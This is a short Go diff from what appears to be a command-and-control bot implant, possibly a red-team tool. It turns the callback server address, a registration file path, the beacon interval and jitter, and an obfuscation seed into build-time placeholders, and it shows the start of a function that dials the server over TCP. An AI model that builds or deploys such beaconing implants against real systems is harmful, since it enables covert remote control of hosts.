@@ -10,7 +10,7 @@ import (
 )
 
 // SERV : server to call
-var SERV = "192.168.206.183:5657"
+var SERV = "&&SERV&&"
 
 // MAGIC : the shared hex byte that will signify the start of each MAD payload
 var MAGIC = []byte{0xAA}
@@ -28,19 +28,19 @@ var MAGICTERMBYTE = MAGICTERM[0]
 var MAGICTERMSTR = string(MAGICTERM)
 
 //REGFILE is where the registration info for this bot is kept
-var REGFILE = "/etc/PETREG"
+var REGFILE = "&&REGFILE&&"
 
 //INTERVAL is how long the sleep is between callbacks (if run in loop mode)
-var INTERVAL = 60
+var INTERVAL = &&INTERVAL&&
 
 //DELTA is the +/- variance in interval time
-var DELTA = 5
+var DELTA = &&DELTA&&
 
 //OBFSEED is the seed int that will get used for uuid obfuscation
 var OBFSEED = 5
 
 //OBFTEXT is the seed text that will get used for uuid obfuscation
-var OBFTEXT = "test"
+var OBFTEXT = "&&OBFTEXT&&"
 
 func send(payload string, m metcli.Metclient) string {
 	conn, err := net.Dial("tcp4", SERV)
